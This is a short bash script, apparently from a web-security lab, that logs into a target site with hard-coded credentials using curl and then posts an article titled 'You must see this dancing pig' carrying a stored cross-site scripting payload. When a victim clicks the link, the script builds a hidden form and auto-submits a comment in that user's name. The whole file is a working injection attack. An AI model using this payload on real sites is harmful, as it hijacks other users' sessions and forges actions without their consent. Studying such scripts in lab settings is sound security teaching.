url="$1";
curl -c cookie.txt -d "username=alice&password=passw0rd&form=login&submit=login" "$url/post.php";
content="<a href= \"javascript:newPost();\">dancingPig.png</a ><script>function newPost(){ var aTags = document.querySelectorAll(\"a\"); var foundTag; for (var i = aTags.length-1; i >=0; i--){ if (aTags[i].textContent === \"You must see this dancing pig\"){ foundTag = aTags[i]; break; } } var results = foundTag.getAttribute(\"href\").match(/view\.php\?id=(\d+)/); var postId = results[1]; var form = document.createElement(\"form\"); form.setAttribute('action' ,\"post.php\"); form.setAttribute('method' ,\"post\"); var textArea = document.createElement(\"textarea\"); textArea.setAttribute('rows', \"4\"); textArea.setAttribute('cols', \"50\"); textArea.setAttribute('name' ,\"comment\"); textArea.value = \"Good post! I like it!\"; var input1 = document.createElement(\"input\"); input1.setAttribute('type' ,\"hidden\"); input1.setAttribute('name' ,\"form\"); input1.setAttribute('value' ,\"comment\"); var input2 = document.createElement(\"input\"); input2.setAttribute('type' ,\"hidden\"); input2.setAttribute('name' ,\"parent\"); input2.setAttribute('value' ,postId); var input3 = document.createElement(\"input\"); input3.setAttribute('type' ,\"submit\"); input3.setAttribute('name' ,\"submit\"); input3.setAttribute('value' ,\"Post\"); form.appendChild(textArea); form.appendChild(input1); form.appendChild(input2); form.appendChild(input3); document.getElementsByTagName('body')[0].appendChild(form); form.submit.click(); }</script>"
curl -b cookie.txt -d "title=You must see this dancing pig&type=1&form=content&submit=Post" --data-urlencode "content=$content" "$url/post.php";
rm cookie.txt